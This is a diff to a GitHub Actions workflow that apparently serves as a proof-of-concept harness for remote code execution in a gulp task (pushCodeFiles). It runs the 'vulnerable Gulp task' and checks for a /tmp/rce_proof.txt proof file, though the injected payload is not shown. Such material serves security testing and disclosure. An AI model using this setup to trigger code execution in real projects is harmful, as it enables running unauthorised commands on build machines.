@@ -14,26 +14,21 @@ jobs:
         with:
           node-version: '12'
       - name: Install dependencies
-        run: npm install gulp@3.9.1 gulp-shell@0.8.0 gulp-zip@3.2.0 babel-register run-sequence@1.2.3 gulp-concat@2.6.1
+        run: npm install gulp@3.9.1 gulp-shell@0.8.0 gulp-zip@3.2.0 babel-register run-sequence@1.2.3 gulp-concat@2.6.1 gulp-util@3.0.8 babel-core@6.26.3
       - name: Debug environment
         run: |
-          echo "Node version:"
-          node --version
-          echo "NPM packages:"
-          npm list gulp gulp-shell gulp-zip babel-register run-sequence gulp-concat
-          echo "Package version:"
-          node -p "require('./package.json').version"
-          echo "Gulpfile snippet:"
-          cat gulpfile.babel.js | grep pushCodeFiles -A10
+          echo "Node version:" && node --version
+          echo "NPM packages:" && npm list gulp gulp-shell gulp-zip babel-register run-sequence gulp-concat gulp-util babel-core
+          echo "Package version:" && node -p "require('./package.json').version"
+          echo "Gulpfile snippet:" && cat gulpfile.babel.js | grep pushCodeFiles -A10
       - name: Run vulnerable Gulp task
         run: |
           echo "Running gulp pushCodeFiles with version: $(node -p "require('./package.json').version")"
-          npx gulp pushCodeFiles || echo "Gulp task failed (expected if gsutil missing); check for RCE output above"
+          npx gulp pushCodeFiles || echo "Gulp task failed (expected if gsutil missing); check RCE output"
       - name: Check for proof file
         run: |
           if [ -f /tmp/rce_proof.txt ]; then
-            echo "Proof file found:"
-            cat /tmp/rce_proof.txt
+            echo "Proof file found:" && cat /tmp/rce_proof.txt
           else
             echo "No proof file found (sandbox restriction)"
           fi
